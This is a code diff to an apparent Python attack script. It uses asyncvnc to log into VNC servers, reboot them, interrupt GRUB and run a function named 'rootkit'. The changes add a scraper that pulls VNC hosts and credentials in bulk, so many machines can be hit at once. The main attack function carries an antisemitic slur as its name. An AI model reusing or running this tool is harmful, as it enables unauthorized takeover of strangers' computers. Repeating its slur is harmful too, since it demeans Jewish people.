@@ -3,6 +3,7 @@
 import sys
 import time
 import asyncio, asyncvnc
+import scrape
 
 shift_chars = {
     '~': '`', '!': '1', '@': '2', '#': '3', '$': '4', '%': '5', '^': '6', '&': '7',
@@ -60,14 +61,16 @@ def rootkit(client):
         time.sleep(7.5)
 
 async def jew(ip, port, username, password):
+    print(f"connecting to {ip}:{port}")
     async with asyncvnc.connect(ip, int(port), username, password) as client:
+        print(f"connected to {ip}:{port}")
         reboot(client)
         grub_enter(client)
         grub_boot(client)
         rootkit(client)
 
 async def main():
-    tasks = [jew(*vnc.split(":")) for vnc in sys.argv[1:]]
+    tasks = [jew(vnc["HostIp"], vnc["Port"], vnc["Username"], vnc["Password"]) for vnc in scrape.get_vncs(*sys.argv[1:])]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 if __name__ == '__main__':
